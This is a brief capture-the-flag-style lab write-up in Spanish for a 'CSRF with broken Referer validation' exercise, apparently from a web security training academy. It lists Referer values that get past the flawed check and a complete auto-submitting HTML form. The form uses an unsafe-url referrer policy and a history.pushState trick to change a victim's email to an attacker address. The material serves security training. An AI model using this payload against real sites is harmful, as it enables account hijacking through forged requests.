---
title: "12 - CSRF with broken Referer validation"
---

# 12 - CSRF with broken Referer validation

Este referrer funciona y no devuelve error

```
Referer: https://exploit-0aa5000303792b0480f984f8017d0059.exploit-server.net/0a9f001003912b8a80bf852f005e00c1.web-security-academy.net/
```

O este :

```
Referer: https://exploit-0aa5000303792b0480f984f8017d0059.exploit-server.net?0a9f001003912b8a80bf852f005e00c1.web-security-academy.net/
```


```HTML
<!-- En https://0a1200a8043a9d448163399400e50074.exploit-server.net/ -->
<html>
 <head>
   <meta name="referrer" content="unsafe-url">
 </head>
  <body>
    <form action="https://0a9f001003912b8a80bf852f005e00c1.web-security-academy.net/my-account/change-email"
          method="POST"
          referrerpolicy="origin">
      <input type="hidden" name="email" value="test@evil.com">
      <input type="submit" value="Send">
    </form>
    <script>
      history.pushState('', '', '/0a9f001003912b8a80bf852f005e00c1.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
